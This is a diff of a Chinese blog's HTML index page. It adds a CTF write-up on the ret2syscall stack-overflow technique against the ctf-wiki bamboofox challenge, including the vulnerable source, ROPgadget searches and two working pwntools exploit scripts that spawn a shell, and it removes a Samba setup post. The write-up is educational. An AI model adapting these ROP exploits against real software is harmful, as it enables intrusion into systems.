@@ -258,6 +258,237 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/栈溢出之ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/02/25/栈溢出之ret2syscall/" itemprop="url">
+                  栈溢出之ret2syscall
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-25T21:12:05+08:00">
+                2020-02-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/02/25/栈溢出之ret2syscall/" class="leancloud_visitors" data-flag-title="栈溢出之ret2syscall">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在NX保护机制被打开无法使用ret2shellcode，且代码中没有可利用片段时无法使用ret2text时，仍然有很多方法可以构造恶意代码，这篇文章就介绍另一种方法：ret2syscall</p>
+<h2 id="ret2syscall原理"><a href="#ret2syscall原理" class="headerlink" title="ret2syscall原理"></a>ret2syscall原理</h2><p>ret2syscall，系统呼叫，也叫系统调用，顾名思义，ret2syscall是一种通过系统调用来执行恶意代码的攻击方式。</p>
+<p>在计算机中，系统调用指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。当进程执行系统调用时，先调用系统调用库中定义某个函数，该函数通常被展开成前面提到的_syscallN的形式通过int 0x80来陷入核心，其参数也将被通过寄存器传往核心。</p>
+<p>系统调用相关的知识就不再赘述，感兴趣的可以去查阅相关资料，下来通过实验来详细说明一下这种攻击方式。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>本题目我们使用ctf-wiki中basicROP-ret2syscall的例子。直接在<a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall中提供的链接下载即可（ctf-wiki中旧链接题目已经被迁移到同作者另一个项目ctf-challenges中）。" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall中提供的链接下载即可（ctf-wiki中旧链接题目已经被迁移到同作者另一个项目ctf-challenges中）。</a></p>
+<p>题目链接：<br><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall</a></p>
+<p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *shell = &quot;/bin/sh&quot;;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">    setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">    </span><br><span class="line">    char buf[100];</span><br><span class="line"></span><br><span class="line">    printf(&quot;This time, no system() and NO SHELLCODE!!!\n&quot;);</span><br><span class="line">    printf(&quot;What do you plan to do?\n&quot;);</span><br><span class="line">    gets(buf);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>面对不是我们自己编译的程序，首先file命令查看程序，然后将程序放入gdb中，使用checksec查看一下安全机制。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall01.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall02.png" alt=""></p>
+<p>分析程序，在15行gets(buf)中很明显有栈溢出，但是本例中，既没有可以执行的恶意代码system(“/bin/sh”)，也有NX保护，无法直接构造执行shellcode。但是具有一个”/bin/sh”字符串，这个字符串看上去一定有问题，却无法直接利用，我们根据前面讲到的系统调用的定义，查阅相关资料，就会有一些思路。</p>
+<p>我们如果想使用系统调用int 0x80来打开一个shell，就需要构造一个如下指令的系统调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure></p>
+<p>由于我们刚才file看到这个程序是32位程序，就需要当eax是int 0xb时，就可以调用系统指令execve。</p>
+<p>这个指令有三个参数，分别是”/bin/sh”,NULL,NULL。</p>
+<p>那我们在执行时就还需要三个额外的寄存器来存储这三个值，分别是ebx、ecx、edx。</p>
+<p>需要的操作有以下四点：</p>
+<ul>
+<li>1.使eax等于int 0xb，触发execve()。</li>
+<li>2.ebx是第一个参数，要赋值为”/bin/sh”</li>
+<li>3.ecx是第二个参数，要赋值为0</li>
+<li>4.ecx是第三个参数，要赋值为0</li>
+</ul>
+<p>所以我们要寻找int 0x80，”/bin/sh”的地址，以及对eax、ebx、ecx、edx四个寄存器赋值的指令地址。</p>
+<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用到一个工具ROPgadget。</p>
+<p>1.寻找int 0x80地址</p>
+<p>ROPgadget –binary ret2syscall –only “int”</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall03.png" alt=""></p>
+<p>2.寻找”/bin/sh”地址</p>
+<p>ROPgadget –binary ret2syscall –string “/bin/sh”</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall04.png" alt=""></p>
+<p>3.寻找对eax赋值的地址</p>
+<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep eax</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall05.png" alt=""></p>
+<p>4.寻找对ebx赋值的地址</p>
+<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall06.png" alt=""></p>
+<p>5.寻找对ecx赋值的地址</p>
+<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ecx</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall07.png" alt=""></p>
+<p>6.寻找对edx赋值的地址</p>
+<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep edx</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall08.png" alt=""></p>
+<p>从ROPgadget的结果可以得到，int 0x80的地址是0x8049421，”/bin/sh”的地址是0x80be408，对eax赋值的地址是0x80bb196，连续对ebx、ecx、edx赋值的地址是0x806eb90。</p>
+<p>此时我们所有需要的信息都得到了，就可以开始构造我们的payload了。</p>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，要在将返回地址指向int 0x80,在返回之前要将四个寄存器赋值完成，所以最终payload构成是</p>
+<p>payload = padding+pop_eax+”0xb”+pop_edx_ecx_ebx+0+0+”/bin/sh”+int 0x80</p>
+<p>padding是填充的偏移</p>
+<p>payload = “A”*112+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</p>
+<p>然后写出exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2syscall&apos;)</span><br><span class="line"></span><br><span class="line">eax = 0x080bb196</span><br><span class="line">edx_ecx_ebx = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = &quot;A&quot;*112+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>执行exp即可获取shell</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall09.png" alt=""></p>
+<p>当然也可以通过别的方法分别赋值几个寄存器，只要最后让每一个寄存器的值都符合条件，就可以触发。如：</p>
+<p>上面我们打印了grep ecx和edx时得到的</p>
+<p>ecx_ebx = 0x0806eb91</p>
+<p>edx = 0x0806eb6a</p>
+<p>那么payload也可以写成</p>
+<p>payload = “A”*112+p32(eax)+p32(0xb)+p32(ecx_ebx)+p32(0)+p32(binsh)+p32(edx)+p32(0)+p32(int_0x80)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2syscall&apos;)</span><br><span class="line"></span><br><span class="line">eax = 0x080bb196</span><br><span class="line">ecx_ebx = 0x0806eb91</span><br><span class="line">edx = 0x0806eb6a</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = &quot;A&quot;*112+p32(eax)+p32(0xb)+p32(ecx_ebx)+p32(0)+p32(binsh)+p32(edx)+p32(0)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行exp2获取shell</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2syscall10.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/24/栈溢出之ret2shellcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1995,188 +2226,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/02/samba安装与配置/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2019/09/02/samba安装与配置/" itemprop="url">
-                  samba安装与配置
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-02T23:21:05+08:00">
-                2019-09-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/linux/" itemprop="url" rel="index">
-                    <span itemprop="name">linux</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2019/09/02/samba安装与配置/" class="leancloud_visitors" data-flag-title="samba安装与配置">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="samba-简介"><a href="#samba-简介" class="headerlink" title="samba 简介"></a>samba 简介</h3><p>Samba，用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协定做连结，在Windows与UNIX系列OS之间搭起一座桥梁，使两者可以进行资源共享。<br>常用于需要频繁访问和读写文件的情况，如在windows下使用人性化的编辑器来书写或修改代码，在linux中进行频繁的编译验证这种场景。本文就以这种场景为例介绍samba的安装和配置。</p>
-<h3 id="samba-安装"><a href="#samba-安装" class="headerlink" title="samba 安装"></a>samba 安装</h3><p>根据自身情况选择命令安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install samba</span><br><span class="line">apt-get install samba</span><br><span class="line">yum install samba</span><br></pre></td></tr></table></figure></p>
-<h3 id="samba-配置"><a href="#samba-配置" class="headerlink" title="samba 配置"></a>samba 配置</h3><p>进入samba配置文件目录，编辑配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/samba</span><br><span class="line">vi smb.conf</span><br></pre></td></tr></table></figure></p>
-<p>在末尾添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[share]</span><br><span class="line">    path =/home/share</span><br><span class="line">    available = yes</span><br><span class="line">    browsealbe = yes</span><br><span class="line">    public= no</span><br><span class="line">    writable = yes</span><br></pre></td></tr></table></figure></p>
-<p>然后在/home下创建share目录，并提升权限至777<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">mkdir share</span><br><span class="line">chmod -R 777 share</span><br></pre></td></tr></table></figure></p>
-<p>然后添加samba用户share，注意这里必须先添加一个同名的系统用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd share</span><br><span class="line">smbpasswd -a share</span><br></pre></td></tr></table></figure></p>
-<p>设置完成密码后重启samba服务</p>
-<p>根据不同系统，选择不同命令启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/samba restart</span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure></p>
-<p>完成后，通过windows访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\linux机器的ip</span><br></pre></td></tr></table></figure></p>
-<p>输入账号密码进入共享文件夹，开始方便的资源共享。</p>
-<p>接着就可以把需要在linux环境运行的代码，git clone到share目录下然后使用windows的编辑器编辑了。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2226,7 +2275,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">98</span>
+                <span class="site-state-item-count">99</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
